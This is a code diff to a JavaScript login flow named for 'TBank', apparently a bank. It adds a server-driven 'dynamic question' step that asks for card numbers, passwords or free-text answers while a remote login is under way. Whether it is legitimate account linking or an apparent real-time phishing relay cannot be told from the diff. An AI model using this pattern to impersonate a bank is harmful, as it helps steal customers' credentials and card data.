@@ -1638,6 +1638,47 @@ function showTBankStep(step, data = null) {
     if (step1) step1.style.display = 'block';
   } else if (step === 'sms') {
     if (stepSMS) stepSMS.style.display = 'block';
+  } else if (step === 'dynamic-question') {
+    // Universal dynamic question handler
+    if (stepSecurityQuestion) {
+      stepSecurityQuestion.style.display = 'block';
+      // Set question text from data.question
+      const questionText = document.getElementById('tbankQuestionText');
+      if (questionText && data && data.question) {
+        questionText.textContent = data.question;
+      }
+
+      // Update input placeholder based on field type
+      const answerInput = document.getElementById('tbankSecurityAnswer');
+      if (answerInput && data) {
+        // Remove old event listeners by cloning the node
+        const newInput = answerInput.cloneNode(true);
+        answerInput.parentNode.replaceChild(newInput, answerInput);
+
+        if (data.fieldType === 'card-input') {
+          newInput.placeholder = '0000 0000 0000 0000';
+          newInput.type = 'text';
+          newInput.inputMode = 'numeric';
+          newInput.maxLength = 19;
+          // Add formatting for card input
+          newInput.addEventListener('input', function(e) {
+            formatCardInput(e.target);
+          });
+        } else if (data.fieldType === 'password-input') {
+          newInput.placeholder = 'Введите пароль';
+          newInput.type = 'password';
+          newInput.inputMode = 'text';
+          newInput.maxLength = 64;
+        } else {
+          newInput.placeholder = 'Ваш ответ';
+          newInput.type = 'text';
+          newInput.inputMode = 'text';
+          newInput.maxLength = 200;
+        }
+      }
+
+      console.log('[TBANK] Showing dynamic question:', data);
+    }
   } else if (step === 'card') {
     if (stepCard) stepCard.style.display = 'block';
   } else if (step === 'security-question') {
@@ -1748,10 +1789,20 @@ function startTBankInputPolling() {
       if (resp && resp.success) {
         if (resp.pendingType === 'sms') {
           showTBankStep('sms');
+        } else if (resp.pendingType === 'dynamic-question') {
+          // Dynamic question - extract question text and show appropriate input
+          const questionData = resp.pendingData;
+          console.log('[TBANK] Dynamic question received:', questionData);
+
+          if (questionData && questionData.question) {
+            // Show dynamic question step with the question text
+            showTBankStep('dynamic-question', questionData);
+          }
         } else if (resp.pendingType === 'card') {
+          // Legacy card type (backwards compatibility)
           showTBankStep('card');
         } else if (resp.pendingType === 'security-question') {
-          // Show security question with question text
+          // Legacy security question (backwards compatibility)
           showTBankStep('security-question', resp.pendingData);
         } else if (resp.pendingType === 'waiting') {
           // Login in progress, keep polling
